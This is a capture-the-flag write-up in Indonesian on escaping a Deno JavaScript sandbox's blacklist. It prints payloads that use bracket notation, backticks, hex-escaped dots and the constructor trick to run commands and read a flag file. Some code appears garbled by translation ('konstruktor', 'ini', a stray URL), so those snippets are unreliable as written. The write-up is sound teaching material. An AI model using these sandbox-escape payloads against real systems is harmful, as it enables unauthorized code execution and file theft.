# DENO2

Alat

- Terminal
- Node
- Sublime text

Untuk menyelesaikan deno2 kita harus mencari tahu cara untuk mem-bypass const BLACK_LIST. Untungnya kita diberikan dua petunjuk yang memberitahu kita bahwa ada cara lain untuk memanggil fungsi/atribut/metode dari objek selain menggunakan titik, yaitu dengan menggunakan metode 

```jsx
object[`function`]
```

Disini kita sudah tahu cara mem-bypass pemanggilan fungsi tapi bagaimana dengan pemanggilan deno?.

Disitulah Deno masuk daftar hitam, dengan sedikit tekad dan pengetahuan yang minim saya bertanya kepada Mr. Google. Setelah berselancar di Google saya menemukan sebuah artikel yang menyatakan bahwa kita dapat memanggil objek dengan "ini" terlebih dahulu, misalnya this.deno.run().

kemudian dengan petunjuk kedua yang diberikan, saya menggunakan teknik fungsi anonim agar lebih mudah (menurut saya). Fungsi anonim bisa dibuat dengan menulis 

```jsx
({})["constructor"]["constructor"](https://www.notion.so/%22code%22)().
```

() pada akhir code untuk memanggil fungsi anonim.

Dalam tantangan ini, kita tidak bisa menggunakan "" dan '', jadi kita menggantinya dengan (backtick). Untuk payload pertama saya buat seperti ini :
```jsx
({})[konstruktor][konstruktor](ini[\\De\ + \\no\][\\run\]({cmd: [\\ls\]}) )()
```

code di atask ternyata tidak berhasil, karena saya yakin ini harus berhasil. Saya mencoba kode di deno1 dan berhasil. Hmmm kemudian saya cek file dockernya ternyata deno.run tidak boleh, jadi saya ganti dengan membaca langsung filenya seperti yang saya tulis di deno1 yaitu dengan deno.readfilesync(). kodenya akan seperti ini:

```jsx

({})[constructor][constructor](decoder = new TextDecoder(\\utf-8\);data = this[\\De\+\\no\][\\readFileSync\](\\flag\x2etxt\);return decoder[\\decode\](data);)()
```

catatan:\x2e untuk menggantikan . (dot)

Code di atas dapat berhasil. karena menurut saya jawaban saya terlalu panjang, saya bertanya kepada penulis, yang saya tanyakan seperti ini "apakah ada cara lain untuk mendapatkan flag", dan ternyata ada cara lain yaitu dengan menggunakan

```jsx
[][constructor][constructor](return De+no\\x2ereadTextFileSync(\\flag\x2etxt\))()
```

dan

```jsx
[][constructor][constructor](return fetch(\\file:///ctf/flag\x2etxt\)\\x2ethen((a)=>a\\x2etext()\\x2ethen((b )=>konsol\\x2elog(b))))()
```

terima kasih kepada mas Dimas yang telah membantu saya.

### Referensi yang mungkin bisa membantu

[# HackTheBox "Business CTF" - discordvm - Node.js Sandbox Escape](https://www.youtube.com/watch?v=pzh6--wIp24&t=534s)

[Escaping nodejs vm](http://Gist.github.com/jcreedcmu/4f6e6d4a649405a9c86bb076905696af)
